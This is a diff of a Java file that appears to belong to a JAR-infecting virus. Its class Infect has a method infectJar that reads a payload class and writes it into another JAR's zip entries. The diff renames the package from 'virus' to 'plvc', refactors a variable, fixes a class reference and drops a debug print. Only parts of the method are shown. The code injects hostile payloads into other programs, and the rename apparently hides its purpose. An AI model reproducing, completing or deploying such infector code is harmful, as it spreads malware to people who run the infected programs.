@@ -1,4 +1,4 @@
-package virus;
+package plvc;
 
 import java.io.*;
 import java.util.Enumeration;
@@ -8,10 +8,10 @@ import java.util.zip.ZipOutputStream;
 
 public class Infect {
 
-    public static String returnMainClass = null;
-
     public static void infectJar(File file, String payloadClass) throws IOException {
-        InputStream pis = Run.class.getResourceAsStream("/" + payloadClass.replace('.', '/') + ".class");
+        String returnMainClass = null;
+
+        InputStream pis = Infect.class.getResourceAsStream("/" + payloadClass.replace('.', '/') + ".class");
         ByteArrayOutputStream baos1 = new ByteArrayOutputStream();
         for (int i = pis.read(); i != -1; i = pis.read()) {
             baos1.write(i);
@@ -66,7 +66,6 @@ public class Infect {
         byte[] editedPayloadData = bos.toByteArray();
 
         zos.putNextEntry(new ZipEntry(payloadClass.replace('.', '/') + ".class"));
-        System.out.println(new String(editedPayloadData));
         zos.write(editedPayloadData, 0, editedPayloadData.length);
         zos.closeEntry();
 
